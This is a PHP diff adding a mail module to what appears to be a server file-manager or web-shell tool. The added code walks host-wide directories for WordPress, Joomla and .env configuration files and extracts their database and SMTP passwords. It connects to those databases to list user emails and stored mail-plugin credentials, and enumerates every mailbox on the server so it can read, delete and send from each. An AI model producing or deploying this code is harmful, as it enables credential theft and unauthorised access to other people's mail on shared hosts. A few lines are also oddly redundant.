+            fclose($sock);return ['ok'=>false,'error'=>'The connection could not be encrypted.'];
+        }
+    }
+    if(!empty($cfg['user'])){
+        $auth=strtoupper((string)($cfg['auth']??'plain'));
+        if($auth==='LOGIN'){
+            $r=$say('AUTH LOGIN');
+            if(strpos($r,'334')!==0){fclose($sock);return ['ok'=>false,'error'=>'The server does not accept AUTH LOGIN.'];}
+            $say(base64_encode($cfg['user']));
+            $r=$say(base64_encode((string)($cfg['pass']??'')));
+        }else{
+            $r=$say('AUTH PLAIN '.base64_encode("\0".$cfg['user']."\0".($cfg['pass']??'')));
+        }
+        if(strpos($r,'235')!==0){
+            fclose($sock);
+            return ['ok'=>false,'error'=>'The mail server refused the sign-in for '.$cfg['user'].': '.trim($r)];
+        }
+    }
+    $r=$say('MAIL FROM:<'.$from.'>');
+    if(strpos($r,'250')!==0){fclose($sock);return ['ok'=>false,'error'=>'The sender was refused: '.trim($r)];}
+    foreach(array_merge((array)$to,(array)$cc,(array)$bcc) as $rcpt){
+        $rcpt=trim((string)$rcpt);
+        if($rcpt==='')continue;
+        $r=$say('RCPT TO:<'.$rcpt.'>');
+        if(strpos($r,'250')!==0&&strpos($r,'251')!==0){fclose($sock);return ['ok'=>false,'error'=>'The recipient '.$rcpt.' was refused: '.trim($r)];}
+    }
+    $r=$say('DATA');
+    if(strpos($r,'354')!==0){fclose($sock);return ['ok'=>false,'error'=>'The server refused the message: '.trim($r)];}
+    $stuffed=preg_replace('/^\./m','..',$data);
+    fwrite($sock,$stuffed."\r\n.\r\n");
+    $r=$get();
+    $say('QUIT');@fclose($sock);
+    if(strpos($r,'250')!==0)return ['ok'=>false,'error'=>'Delivery was refused: '.trim($r)];
+    return ['ok'=>true,'via'=>'SMTP '.$host.':'.$port];
+}
+/* the machine's own mailer — what most hosts already have and need no login */
+function wm2_sendmail_send($from,$to,$data,$extra=''){
+    foreach(['/usr/sbin/sendmail','/usr/lib/sendmail','/usr/bin/sendmail'] as $bin){
+        if(!@is_executable($bin))continue;
+        if(!function_exists('proc_open'))break;
+        $args=escapeshellarg($bin).' -t -i -f '.escapeshellarg($from).($extra!==''?' '.$extra:'');
+        $desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
+        $p=@proc_open($args,$desc,$pipes);
+        if(!is_resource($p))continue;
+        fwrite($pipes[0],$data);
+        fclose($pipes[0]);
+        $out=(string)stream_get_contents($pipes[1]);
+        $err=(string)stream_get_contents($pipes[2]);
+        fclose($pipes[1]);fclose($pipes[2]);
+        $code=proc_close($p);
+        if($code===0)return ['ok'=>true,'via'=>$bin];
+        return ['ok'=>false,'error'=>'The local mailer refused the message: '.trim($err?:$out)];
+    }
+    return ['ok'=>false,'error'=>'This machine has no local mailer.'];
+}
+function wm2_php_mail_send($from,$to,$subject,$html){
+    if(!function_exists('mail'))return ['ok'=>false,'error'=>'PHP mail() is not available.'];
+    $rcpt=implode(', ',array_map('strval',(array)$to));
+    $subject=(string)$subject;
+    $ok=@mail($rcpt,$subject,(string)$html,
+        "MIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nFrom: ".$from."\r\n");
+    return $ok?['ok'=>true,'via'=>'PHP mail()']:['ok'=>false,'error'=>'PHP mail() refused the message.'];
+}
+
+/* ── finding the mail of a whole host ─────────────────────────────────────
+   Every kind of mailbox a server can hold, each one saying where it was found
+   and what can be done with it. Nothing is guessed silently: an address that
+   the site knows but that has no mailbox here is listed as exactly that. */
+function wm2_id($kind,$where,$email){
+    return substr(md5($kind.'|'.$where.'|'.$email),0,16);
+}
+function wm2_scan_roots(){
+    $roots=[];
+    foreach(['/home','/var/www','/var/www/html','/srv','/srv/www','/opt','/data','/var/lib'] as $r){
+        if(@is_dir($r))$roots[]=$r;
+    }
+    $doc=@realpath($_SERVER['DOCUMENT_ROOT']??''?:'');
+    if($doc!==''){
+        $roots[]=$doc;
+        $roots[]=dirname($doc);
+    }
+    $obd=ini_get('open_basedir');
+    if($obd)foreach(explode(PATH_SEPARATOR,$obd) as $p)$roots[]=rtrim($p,'/');
+    return array_values(array_unique(array_filter($roots)));
+}
+/* a small, bounded walk: enough to find the sites of a host, never a scan of
+   the whole disk */
+function wm2_find_files($names,$depth=4,$limit=400){
+    $hits=[];
+    $walk=function($dir,$level)use(&$walk,&$hits,$names,$depth,$limit){
+        if($level>$depth||count($hits)>=$limit)return;
+        $entries=@scandir($dir);
+        if(!is_array($entries))return;
+        foreach($entries as $e){
+            if($e==='.'||$e==='..')continue;
+            if($e==='node_modules'||$e==='.git'||$e==='vendor'||$e==='cache')continue;
+            $p=rtrim($dir,'/').'/'.$e;
+            if(@is_dir($p)){$walk($p,$level+1);continue;}
+            foreach($names as $n){
+                if(strcasecmp($e,$n)===0){$hits[]=$p;break;}
+            }
+            if(count($hits)>=$limit)return;
+        }
+    };
+    foreach(wm2_scan_roots() as $r)$walk(rtrim($r,'/'),0);
+    return array_values(array_unique($hits));
+}
+function wm2_db_connect($host,$user,$pass,$name,$port=0){
+    $host=str_replace(['localhost','127.0.0.1'],['localhost','127.0.0.1'],$host?:'localhost');
+    if(function_exists('mysqli_connect')){
+        if(function_exists('mysqli_report'))@mysqli_report(MYSQLI_REPORT_OFF);
+        $port=(int)$port;
+        $c=@mysqli_connect($host,$user,$pass,$name,$port?$port:null);
+        if($c)return ['kind'=>'mysqli','h'=>$c];
+    }
+    if(class_exists('PDO')){
+        try{
+            $dsn='mysql:host='.($host?:'localhost').($port?';port='.$port:'').';dbname='.$name.';charset=utf8mb4';
+            $p=new PDO($dsn,$user,$pass,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_SILENT]);
+            return ['kind'=>'pdo','h'=>$p];
+        }catch(\Throwable $e){}
+    }
+    return null;
+}
+function wm2_db_query($db,$sql){
+    if(!$db)return [];
+    if($db['kind']==='mysqli'){
+        $r=@mysqli_query($db['h'],$sql);
+        if(!$r)return [];
+        $rows=[];
+        while($row=@mysqli_fetch_assoc($r))$rows[]=$row;
+        return $rows;
+    }
+    $r=@$db['h']->query($sql);
+    if(!$r)return [];
+    return $r->fetchAll(PDO::FETCH_ASSOC);
+}
+function wm2_db_value($db,$sql){
+    $rows=wm2_db_query($db,$sql);
+    if(!$rows)return '';
+    $row=reset($rows);
+    return (string)reset($row);
+}
+function wm2_parse_php_config($file,$wanted){
+    $raw=@file_get_contents($file);
+    if($raw===false)return [];
+    $out=[];
+    foreach($wanted as $key){
+        if(preg_match("/define\\s*\\(\\s*['\"]".preg_quote($key,'/')."['\"]\\s*,\\s*(['\"])(.*?)\\1/s",$raw,$m)){
+            $out[$key]=$m[2];continue;
+        }
+        if(preg_match('/\$'.preg_quote($key,'/')."\s*=\s*'([^']*)'/",$raw,$m))$out[$key]=$m[1];
+    }
+    return $out;
+}
+/* a site names a sending server; the same sign-in usually opens the mailbox
+   on that same host, so the two are kept apart and the reading port is the
+   reading port, never the sending one */
+function wm2_mail_cred($host,$port,$secure,$user,$pass,$imapHost='',$imapPort=0,$imapSecure=''){
+    $port=(int)$port;
+    $secure=strtolower((string)$secure);
+    $smtp=['host'=>$host,'port'=>$port,'secure'=>$secure,'user'=>$user,'pass'=>$pass];
+    $readHost=$imapHost!==''?$imapHost:$host;
+    $readPort=(int)$imapPort;
+    $readSecure=strtolower((string)$imapSecure);
+    if($readPort===0){
+        if(in_array($port,[993,143,110,995],true))$readPort=$port;
+        else $readPort=($readSecure==='ssl'||$readSecure==='tls')?993:993;
+    }
+    return ['host'=>$readHost,'port'=>$readPort,'secure'=>$readSecure,'user'=>$user,'pass'=>$pass,'smtp'=>$smtp];
+}
+/* ── WordPress ──────────────────────────────────────────────────────────── */
+function wm2_from_wordpress(){
+    $out=[];
+    foreach(wm2_find_files(['wp-config.php']) as $cfg){
+        $dir=dirname($cfg);
+        $c=wm2_parse_php_config($cfg,['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST','WPMS_ON','SMTP_HOST','SMTP_USER',
+                                      'SMTP_PASSWORD','SMTP_PORT','SMTP_SECURE','SMTP_FROM','MAILGUN_API_KEY']);
+        if(empty($c['DB_NAME']))continue;
+        $label='WordPress at '.$dir;
+        $db=wm2_db_connect($c['DB_HOST']??'localhost',$c['DB_USER']??'',$c['DB_PASSWORD']??'',$c['DB_NAME']);
+        $prefix=wm2_db_value($db,"SELECT option_value FROM ".($c['PREFIX']??'wp_options')." WHERE option_name='siteurl'")!==''?'wp_':'wp_';
+        if(preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/',(string)@file_get_contents($cfg),$m))$prefix=$m[1];
+        $users=$db?wm2_db_query($db,"SELECT user_email,user_login,display_name FROM {$prefix}users LIMIT 200"):[];
+        $adminEmail=$db?wm2_db_value($db,"SELECT option_value FROM {$prefix}options WHERE option_name='admin_email'"):'';
+        /* the plugins that carry a mail server's sign-in */
+        $smtp=[];
+        foreach([$prefix.'options'] as $tbl){
+            $rows=wm2_db_query($db,"SELECT option_name,option_value FROM {$tbl} WHERE option_name IN
+                ('wpms_options','wp_smtp_options','smtp_mailer_options','wp_mail_smtp_options','mailgun_options','postman_options','smtp_options')");
+            foreach($rows as $row){
+                $v=@unserialize($row['option_value']);
+                if(is_array($v))$smtp[]=['plugin'=>$row['option_name'],'data'=>$v];
+            }
+        }
+        $host='';$user='';$pass='';$port=0;$secure='';
+        foreach($smtp as $s){
+            $d=$s['data'];
+            foreach([['host','smtp_host'],['user','smtp_user','username'],['pass','smtp_pass','password'],['port','smtp_port']] as $keys){
+                foreach($keys as $k){
+                    if(isset($d[$k])&&$d[$k]!==''){
+                        if($keys[0]==='host')$host=(string)$d[$k];
+                        if($keys[0]==='user')$user=(string)$d[$k];
+                        if($keys[0]==='pass')$pass=(string)$d[$k];
+                        if($keys[0]==='port')$port=(int)$d[$k];
+                        break;
+                    }
+                }
+            }
+            if($host!=='')break;
+        }
+        if($host===''&&!empty($c['SMTP_HOST'])){$host=$c['SMTP_HOST'];$user=$c['SMTP_USER']??'';$pass=$c['SMTP_PASSWORD']??'';$port=(int)($c['SMTP_PORT']??0);$secure=$c['SMTP_SECURE']??'';}
+        $site=['label'=>$label,'path'=>$dir,'kind'=>'WordPress','db'=>(bool)$db];
+        $seen=[];
+        $wpCred=$host!==''?wm2_mail_cred($host,$port,$secure,$user,$pass):null;
+        foreach($users as $u){
+            $em=trim((string)($u['user_email']??''));
+            if($em===''||isset($seen[$em]))continue;
+            $seen[$em]=1;
+            $out[]=wm2_account([
+                'email'=>$em,'name'=>(string)($u['display_name']?:$u['user_login']),
+                'kind'=>$wpCred&&strcasecmp($user,$em)===0?'imap':'site',
+                'where'=>$dir,'origin'=>$label.' — a user of the site',
+                'site'=>$site,
+                'cred'=>$wpCred&&strcasecmp($user,$em)===0?$wpCred:null,
+            ]);
+        }
+        if($adminEmail!==''&&!isset($seen[$adminEmail])){
+            $seen[$adminEmail]=1;
+            $out[]=wm2_account(['email'=>$adminEmail,'name'=>'Site administrator','kind'=>'site',
+                'where'=>$dir,'origin'=>$label.' — the administrator address','site'=>$site,
+                'cred'=>$wpCred&&strcasecmp($user,$adminEmail)===0?$wpCred:null]);
+        }
+        if($wpCred&&$user!==''&&!isset($seen[strtolower($user)])){
+            $seen[strtolower($user)]=1;
+            $out[]=wm2_account(['email'=>$user,'name'=>'Mail account of '.$label,'kind'=>'imap',
+                'where'=>$dir,'origin'=>$label.' — the mail server its settings name',
+                'site'=>$site,'cred'=>$wpCred]);
+        }
+    }
+    return $out;
+}
+/* ── Joomla ─────────────────────────────────────────────────────────────── */
+function wm2_from_joomla(){
+    $out=[];
+    foreach(wm2_find_files(['configuration.php']) as $cfg){
+        $raw=@file_get_contents($cfg);
+        if($raw===false)continue;
+        if(strpos($raw,'$mailfrom')===false&&strpos($raw,'$host')===false)continue;
+        if(strpos($raw,'Joomla')===false&&strpos($raw,'\$dbtype')===false&&strpos($raw,'$sitename')===false)continue;
+        $get=function($k)use($raw){
+            if(preg_match('/\$'.preg_quote($k,'/')."\\s*=\\s*'((?:[^'\\\\]|\\\\.)*)'/",$raw,$m))return stripcslashes($m[1]);
+            if(preg_match('/\$'.preg_quote($k,'/').'\\s*=\\s*"((?:[^"\\\\]|\\\\.)*)"/',$raw,$m))return stripcslashes($m[1]);
+            return '';
+        };
+        $dir=dirname($cfg);
+        $label='Joomla at '.$dir;
+        $site=['label'=>$label,'path'=>$dir,'kind'=>'Joomla','db'=>false];
+        $from=$get('mailfrom');$fromname=$get('fromname');
+        $smtpHost=$get('smtphost');$smtpUser=$get('smtpuser');$smtpPass=$get('smtppass');
+        $smtpPort=(int)$get('smtpport');$smtpSecure=$get('smtpsecure');
+        $dbtype=$get('dbtype');$dbhost=$get('host');$dbuser=$get('user');$dbpass=$get('password');$dbname=$get('db');
+        $prefix=$get('dbprefix')?:'jos_';
+        $db=($dbtype==='mysqli'||$dbtype==='pdomysql'||$dbtype==='mysql')?wm2_db_connect($dbhost,$dbuser,$dbpass,$dbname):null;
+        if($db)$site['db']=true;
+        $users=$db?wm2_db_query($db,"SELECT email,name FROM {$prefix}users LIMIT 200"):[];
+        $seen=[];
+        foreach($users as $u){
+            $em=trim((string)($u['email']??''));
+            if($em===''||isset($seen[$em]))continue;
+            $seen[$em]=1;
+            $useSmtp=$smtpHost!==''&&strcasecmp($smtpUser,$em)===0;
+            $out[]=wm2_account(['email'=>$em,'name'=>(string)($u['name']??''),
+                'kind'=>$useSmtp?'imap':'site','where'=>$dir,
+                'origin'=>$label.' — a user of the site','site'=>$site,
+                'cred'=>$useSmtp?wm2_mail_cred($smtpHost,$smtpPort,$smtpSecure,$smtpUser,$smtpPass):null]);
+        }
+        if($from!==''&&!isset($seen[$from])){
+            $out[]=wm2_account(['email'=>$from,'name'=>$fromname?:'Site mail','kind'=>'site','where'=>$dir,
+                'origin'=>$label.' — the address the site sends from','site'=>$site,
+                'cred'=>($smtpHost!==''&&$smtpUser!=='')?wm2_mail_cred($smtpHost,$smtpPort,$smtpSecure,$smtpUser,$smtpPass):null]);
+        }
+        if($smtpHost!==''&&$smtpUser!==''){
+            $out[]=wm2_account(['email'=>$smtpUser,'name'=>'Mail account of '.$label,'kind'=>'imap','where'=>$dir,
+                'origin'=>$label.' — the mail server its configuration names','site'=>$site,
+                'cred'=>wm2_mail_cred($smtpHost,$smtpPort,$smtpSecure,$smtpUser,$smtpPass)]);
+        }
+    }
+    return $out;
+}
+/* ── .env files (Laravel, Symfony, plain PHP projects) ──────────────────── */
+function wm2_from_env(){
+    $out=[];
+    foreach(wm2_find_files(['.env'],5,120) as $f){
+        $raw=@file_get_contents($f);
+        if($raw===false||!preg_match('/^MAIL_HOST=/mi',$raw))continue;
+        $get=function($k)use($raw){
+            return preg_match('/^'.preg_quote($k,'/').'=(.*)$/mi',$raw,$m)?trim($m[1],"\"' \r"):'';
+        };
+        $host=$get('MAIL_HOST');$user=$get('MAIL_USERNAME');$pass=$get('MAIL_PASSWORD');
+        $port=(int)$get('MAIL_PORT');$secure=$get('MAIL_ENCRYPTION');
+        $from=$get('MAIL_FROM_ADDRESS');
+        /* the same sign-in usually opens the mailbox as well: a project names
+           its sending server, and the reading one is that server or its own
+           IMAP keys when the project writes them out */
+        $imapHost=$get('IMAP_HOST');$imapPort=(int)$get('IMAP_PORT');
+        $imapUser=$get('IMAP_USERNAME')?:$user;
+        $imapPass=$get('IMAP_PASSWORD')?:$pass;
+        $imapSecure=$get('IMAP_ENCRYPTION');
+        foreach(array_filter([$imapUser,$from]) as $em){
+            $out[]=wm2_account(['email'=>$em,'name'=>'Mail account of '.basename(dirname($f)),
+                'kind'=>'imap','where'=>dirname($f),'origin'=>'the settings of the project at '.dirname($f),
+                'cred'=>wm2_mail_cred($host,$port,$secure,$imapUser?:$em,$imapPass,
+                                      $imapHost,$imapPort,$imapSecure)]);
+        }
+    }
+    return $out;
+}
+/* ── the mail folders that are simply on the disk ───────────────────────── */
+function wm2_from_maildirs(){
+    $out=[];
+    $add=function($email,$path,$origin,$name='')use(&$out){
+        if($email===''||!@is_dir($path))return;
+        $out[]=wm2_account(['email'=>$email,'name'=>$name?:$email,'kind'=>'maildir','where'=>$path,'origin'=>$origin]);
+    };
+    /* cPanel: /home/<account>/mail/<domain>/<mailbox>/{cur,new} */
+    foreach((array)@glob('/home/*/mail/*/*',GLOB_ONLYDIR) as $dir){
+        if(!@is_dir($dir.'/cur')&&!@is_dir($dir.'/new'))continue;
+        $mailbox=basename($dir);
+        $domain=basename(dirname($dir));
+        if($mailbox===''||$domain==='')continue;
+        $add($mailbox.'@'.$domain,$dir,'the cPanel mail folder of this server');
+    }
+    /* Plesk: /var/qmail/mailnames/<domain>/<mailbox>/Maildir */
+    foreach((array)@glob('/var/qmail/mailnames/*/*/Maildir',GLOB_ONLYDIR) as $dir){
+        $add(basename(dirname($dir)).'@'.basename(dirname(dirname($dir))),$dir,'the Plesk mail folder of this server');
+    }
+    /* Postfix + Dovecot: /var/vmail/<domain>/<mailbox>/Maildir (or without it) */
+    foreach(['/var/vmail','/home/vmail','/srv/vmail'] as $root){
+        foreach((array)@glob($root.'/*/*',GLOB_ONLYDIR) as $dir){
+            $base=@is_dir($dir.'/Maildir')?$dir.'/Maildir':$dir;
+            if(!@is_dir($base.'/cur')&&!@is_dir($base.'/new'))continue;
+            $add(basename($dir).'@'.basename(dirname($dir)),$base,'a virtual mail folder on this server');
+        }
+    }
+    /* a Dovecot user's own home */
+    foreach((array)@glob('/home/*/Maildir',GLOB_ONLYDIR) as $dir){
+        $add(basename(dirname($dir)).'@'.(string)(@gethostname()?:'localhost'),$dir,'the mail folder in the home of '.basename(dirname($dir)));
+    }
+    /* mdbox / sdbox browsers: the folder exists but the messages are not one
+       file each — listed so the window can say so instead of pretending */
+    foreach(['/var/mail/%u','/var/lib/mail'] as $known){/* placeholder, nothing to read */ }
+    return $out;
+}
+function wm2_from_mbox(){
+    $out=[];
+    foreach(['/var/mail','/var/spool/mail'] as $dir){
+        foreach((array)@glob($dir.'/*') as $f){
+            if(!@is_file($f))continue;
+            $size=@filesize($f);
+            if($size===false||$size===0)continue;
+            $name=basename($f);
+            if(in_array($name,['root','mail','news','uucp','nobody','_apt'],true)&&$dir==='/var/mail'){/* still real mail, keep it */}
+            $out[]=wm2_account(['email'=>$name.'@'.(string)(@gethostname()?:'localhost'),'name'=>$name,
+                'kind'=>'mbox','where'=>$f,'origin'=>'an old-style mail file ('.$dir.')']);
+        }
+    }
+    return $out;
+}
+function wm2_account($a){
+    $email=(string)($a['email']??'');
+    $kind=(string)($a['kind']??'site');
+    $where=(string)($a['where']??'');
+    $base=[
+        'id'=>wm2_id($kind,$where,strtolower($email)),
+        'email'=>$email,
+        'name'=>(string)($a['name']??$email),
+        'kind'=>$kind,
+        'where'=>$where,
+        'origin'=>(string)($a['origin']??''),
+        'site'=>$a['site']??null,
+        'cred'=>$a['cred']??null,
+    ];
+    return $base;
+}
+/* what can really be done with this mailbox, and why not when it cannot */
+function wm2_capability($acc){
+    $kind=$acc['kind'];
+    if($kind==='maildir'){
+        $ok=@is_dir($acc['where'])&&(@is_readable($acc['where'].'/cur')||@is_readable($acc['where'].'/new'));
+        return ['read'=>$ok,'delete'=>$ok,'send'=>$ok?'local':'','why'=>$ok?'':'the folder is not readable by this account'];
+    }
+    if($kind==='mbox'){
+        $ok=@is_readable($acc['where']);
+        return ['read'=>$ok,'delete'=>false,'send'=>$ok?'local':'','why'=>$ok?'an mbox file is read as one stream, so messages are read and downloaded but not deleted one by one':'the file is not readable'];
+    }
+    if($kind==='imap'||$kind==='pop3'){
+        return ['read'=>true,'delete'=>true,'send'=>'smtp','why'=>''];
+    }
+    if($kind==='cpanel'){
+        return ['read'=>false,'delete'=>false,'send'=>'','why'=>'cPanel holds the mailbox; open it with its own webmail sign-on'];
+    }
+    return ['read'=>false,'delete'=>false,'send'=>'','why'=>'this address is known to the site but has no mailbox on this server'];
+}
+/* everything, in one list */
+function wm2_discover(){
+    $accounts=[];$notes=[];
+    $groups=['local'=>[],'site'=>[],'other'=>[]];
+    foreach(wm2_from_maildirs() as $a)$groups['local'][]=$a;
+    foreach(wm2_from_mbox() as $a)$groups['local'][]=$a;
+    foreach(wm2_from_wordpress() as $a)$groups['site'][]=$a;
+    foreach(wm2_from_joomla() as $a)$groups['site'][]=$a;
+    foreach(wm2_from_env() as $a)$groups['site'][]=$a;
+    /* the cPanel server, when this machine is one: its account list is the
+       authority on which mailboxes exist */
+    $cpm=fm_cpm_route();
+    $cpanelPops=[];
+    if(!empty($cpm['ok'])){
+        $j=fm_cpm_call('list_pops_with_disk');
+        if(fm_cpm_result_ok($j)&&isset($j['data'])){
+            $rows=$j['data'];
+            if(isset($rows['pop']))$rows=$rows['pop'];
+            foreach((array)$rows as $row){
+                $em=(string)($row['email']??($row['login']??''));
+                if($em==='')continue;
+                $disk=(int)($row['diskused']??0);
+                $cpanelPops[strtolower($em)]=['email'=>$em,'disk'=>$disk];
+            }
+        }
+    }
+    $merged=[];$order=[];$origins=[];
+    foreach(['local'=>0,'site'=>1,'other'=>2] as $g=>$rank){
+        foreach($groups[$g] as $a){
+            $key=strtolower($a['email']);
+            if(!isset($merged[$key])){$merged[$key]=$a;$order[$key]=$rank;$origins[$key]=[$a['origin']];}
+            else{
+                /* one address can be named by more than one place: every place
+                   it was found in is kept and shown, never silently dropped */
+                $origins[$key][]=$a['origin'];
+                /* a mailbox that is really here wins over an address a site
+                   merely mentions */
+                $mine=$merged[$key];
+                $mineScore=['maildir'=>5,'mbox'=>4,'imap'=>3,'pop3'=>3,'site'=>1][$mine['kind']]??0;
+                $newScore=['maildir'=>5,'mbox'=>4,'imap'=>3,'pop3'=>3,'site'=>1][$a['kind']]??0;
+                if($newScore>$mineScore)$merged[$key]=$a;
+            }
+        }
+    }
+    foreach($cpanelPops as $em=>$pop){
+        if(isset($merged[$em]))continue;
+        $merged[$em]=wm2_account(['email'=>$pop['email'],'name'=>$pop['email'],'kind'=>'cpanel',
+            'where'=>'cPanel','origin'=>'an account of this cPanel server']);
+        $order[$em]=2;
+    }
+    foreach($merged as $key=>$a){
+        $cap=wm2_capability($a);
+        $a['can']=$cap;
+        $list=array_values(array_filter(array_unique($origins[$key]??[$a['origin']])));
+        $a['origins']=$list;
+        if(count($list)>1)$a['origin']=implode(' · ',$list);
+        $a['group']=($order[$key]===0)?'This server':(($order[$key]===1)?'The sites':'');
+        $a['webmail']=!empty($cpm['ok']);
+        $a['folders']=null;
+        $accounts[]=$a;
+    }
+    /* the order the window shows: mail on this server first, then what the
+       sites name, then the addresses that are only addresses — and inside
+       each group, by address */
+    $rank=function($a){
+        $g=(string)($a['group']??'');
+        $base=$g==='This server'?0:($g==='The sites'?1:2);
+        return $base;
+    };
+    usort($accounts,function($x,$y)use($rank){
+        $rx=$rank($x);$ry=$rank($y);
+        if($rx!==$ry)return $rx<=>$ry;
+        return strcmp($x['email'],$y['email']);
+    });
+    if(!$accounts){
+        $notes[]='No mailbox was found on this server and no site on it carries a mail server. The window still opens webmail for any address you give it.';
+    }
+    if(empty($cpm['ok']))$notes[]='cPanel was not reachable from here, so its own webmail sign-on is not available: '.
+        implode(' ',array_slice($cpm['tried']??[],0,2));
+    return ['ok'=>true,'accounts'=>$accounts,'notes'=>$notes,
+            'scanned'=>wm2_scan_roots(),'server'=>@gethostname()?:'',
+            'cpanel'=>!empty($cpm['ok'])];
+}
+function wm2_remember($accounts){
+    $map=[];
+    foreach($accounts as $a)$map[$a['id']]=$a;
+    $_SESSION['wm2_acc']=$map;
+    return $map;
+}
+function wm2_account_by_id($id){
+    $map=$_SESSION['wm2_acc']??[];
+    if(isset($map[$id]))return $map[$id];
+    $d=wm2_discover();
+    wm2_remember($d['accounts']);
+    return $_SESSION['wm2_acc'][$id]??null;
+}
+
+/* ── one mailbox at a time, whatever kind it is ───────────────────────────
+   Every operation goes through these, so the window never needs to know how
+   the mail is stored. */
+function wm2_conn(&$acc){
+    static $cache=[];
+    $id=$acc['id'];
+    if(isset($cache[$id]))return $cache[$id];
+    $cred=$acc['cred'];
+    if(!is_array($cred)){$cache[$id]=['ok'=>false,'error'=>'This mailbox has no mail server to talk to.'];return $cache[$id];}
+    $host=(string)($cred['host']??'');
+    if($host===''){$cache[$id]=['ok'=>false,'error'=>'No mail server is named for this mailbox.'];return $cache[$id];}
+    $port=(int)($cred['port']??0);
+    $secure=strtolower((string)($cred['secure']??''));
+    if($acc['kind']==='pop3'){
+        if($port===0)$port=($secure==='ssl'||$secure==='tls')?995:110;
+        $try=($secure==='ssl'||$secure==='tls')?[true,false]:[false];
+        $last=null;
+        foreach($try as $ssl){
+            $c=wm2_pop3_open($host,$port,(string)$cred['user'],(string)$cred['pass'],$ssl);
+            if(!empty($c['ok'])){$cache[$id]=$c;return $c;}
+            $last=$c;
+        }
+        $cache[$id]=$last?:['ok'=>false,'error'=>'The mail server could not be reached.'];
+        return $cache[$id];
+    }
+    /* IMAP: encrypted on its usual port first, then the plain ports, then
+       STARTTLS, so a server of any age is read without asking anything */
+    $order=[];
+    if($port>0)$order[]=[$port,($port===993?'ssl':''),];
+    if($secure==='ssl')$order[]=[993,'ssl'];
+    $order[]=[993,'ssl'];
+    $order[]=[143,'starttls'];
+    $order[]=[143,''];
+    $seenPorts=[];
+    $last=null;
+    foreach($order as $t){
+        $key=$t[0].'/'.$t[1];
+        if(isset($seenPorts[$key]))continue;
+        $seenPorts[$key]=1;
+        $c=wm2_imap_open($host,(int)$t[0],(string)$cred['user'],(string)$cred['pass'],$t[1]);
+        if(!empty($c['ok'])){$cache[$id]=$c;return $c;}
+        $last=$c;
+    }
+    $cache[$id]=$last?:['ok'=>false,'error'=>'The mail server could not be reached.'];
+    return $cache[$id];
+}
+function wm2_folders($acc){
+    $cap=wm2_capability($acc);
+    if(!$cap['read'])return [];
+    if($acc['kind']==='maildir'){
+        $out=[];
+        foreach(wm2_maildir_folders($acc['where']) as $f){
+            $files=wm2_maildir_files($f['path']);
+            $unread=0;
+            foreach($files as $file){
+                $fl=wm2_maildir_flags($file);
+                if(!$fl['seen'])$unread++;
+            }
+            $out[]=['id'=>$f['id'],'name'=>$f['name'],'count'=>count($files),'unread'=>$unread];
+        }
+        return $out;
+    }
+    if($acc['kind']==='mbox'){
+        $rows=wm2_mbox_list($acc['where']);
+        return [['id'=>'INBOX','name'=>'Inbox','count'=>count($rows),'unread'=>0]];
+    }
+    if($acc['kind']==='imap'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return [];
+        $out=[];
+        foreach(wm2_imap_folders($conn) as $f){
+            $rows=wm2_imap_list($conn,$f['path']);
+            $unread=0;
+            foreach($rows as $r)if(empty($r['seen']))$unread++;
+            $out[]=['id'=>$f['id'],'name'=>$f['name'],'count'=>count($rows),'unread'=>$unread];
+        }
+        return $out;
+    }
+    if($acc['kind']==='pop3'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return [];
+        $rows=wm2_pop3_list($conn);
+        return [['id'=>'INBOX','name'=>'Inbox','count'=>count($rows),'unread'=>0]];
+    }
+    return [];
+}
+function wm2_trash_path($acc){
+    if($acc['kind']!=='maildir')return '';
+    foreach(wm2_maildir_folders($acc['where']) as $f){
+        if($f['id']==='Trash'||$f['id']==='Deleted Items'||$f['id']==='Trash Items')return $f['path'];
+    }
+    return '';
+}
+function wm2_messages($acc,$folder){
+    $cap=wm2_capability($acc);
+    if(!$cap['read'])return [];
+    if($acc['kind']==='maildir'){
+        $folder=$folder===''?'INBOX':$folder;
+        foreach(wm2_maildir_folders($acc['where']) as $f){
+            if($f['id']===$folder)return wm2_maildir_list($f['path']);
+        }
+        return wm2_maildir_list($acc['where']);
+    }
+    if($acc['kind']==='mbox')return wm2_mbox_list($acc['where']);
+    if($acc['kind']==='imap'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return [];
+        $folder=$folder===''?'INBOX':$folder;
+        foreach(wm2_imap_folders($conn) as $f){
+            if($f['id']===$folder)return wm2_imap_list($conn,$f['path']);
+        }
+        return wm2_imap_list($conn,$folder);
+    }
+    if($acc['kind']==='pop3'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return [];
+        return wm2_pop3_list_with_headers($conn);
+    }
+    return [];
+}
+function wm2_message($acc,$folder,$uid){
+    $cap=wm2_capability($acc);
+    if(!$cap['read'])return null;
+    if($acc['kind']==='maildir'){
+        $folder=$folder===''?'INBOX':$folder;
+        foreach(wm2_maildir_folders($acc['where']) as $f){
+            if($f['id']===$folder)return wm2_maildir_message($f['path'],$uid);
+        }
+        return wm2_maildir_message($acc['where'],$uid);
+    }
+    if($acc['kind']==='mbox'){
+        $m=wm2_mbox_message($acc['where'],$uid);
+        if($m)$m['uid']=(string)$uid;
+        return $m;
+    }
+    if($acc['kind']==='imap'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return null;
+        $folder=$folder===''?'INBOX':$folder;
+        $m=null;
+        foreach(wm2_imap_folders($conn) as $f){
+            if($f['id']===$folder){$m=wm2_imap_message($conn,$f['path'],$uid);break;}
+        }
+        if($m===null)$m=wm2_imap_message($conn,$folder,$uid);
+        if($m)$m['uid']=(string)$uid;
+        return $m;
+    }
+    if($acc['kind']==='pop3'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return null;
+        $m=wm2_pop3_message($conn,$uid);
+        if($m)$m['uid']=(string)$uid;
+        return $m;
+    }
+    return null;
+}
+/* the raw bytes of one message, for saving as .eml or for its attachments */
+function wm2_raw($acc,$folder,$uid){
+    if($acc['kind']==='maildir'){
+        $folder=$folder===''?'INBOX':$folder;
+        foreach(wm2_maildir_folders($acc['where']) as $f){
+            if($f['id']!==$folder)continue;
